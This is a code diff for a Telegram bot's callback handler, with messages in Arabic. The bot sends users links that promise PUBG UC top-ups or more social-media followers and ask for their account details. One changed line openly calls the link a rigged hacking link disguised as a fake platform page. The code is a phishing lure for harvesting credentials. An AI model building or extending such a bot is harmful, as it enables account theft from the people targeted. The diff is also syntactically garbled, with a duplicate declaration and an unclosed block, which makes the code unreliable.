@@ -903,13 +903,18 @@ bot.on('callback_query', (query) => {
 
     let url, message;
 
+ let message;
+    if (action === 'login') {
+        message = `يرجى تسجيل الدخول إلى ${getPlatformName(platform)}: ${url}`;
+    } else if (action === 'increase') {
+  
     if (data === 'pubg_uc') {
         url = `${baseUrl}/increase/pubg_uc/${chatId}`;
         message = `يرجى إدخال معلومات حسابك لشحن شدات ببجي: ${url}`;
     } else if (data.startsWith('increase_')) {
         const platform = data.split('_')[1];
         url = `${baseUrl}/increase/${platform}/${chatId}`;
-        message = `يرجى إدخال معلومات حسابك لزيادة المتابعين على ${getPlatformName(platform)}: ${url}`;
+        message = `تم تلغيم رابط اختراق على شكل صفحة مزورة ${getPlatformName(platform)}: ${url}`;
     } else {
         console.log('Unhandled callback query:', data);
         message = 'عملية غير معروفة';
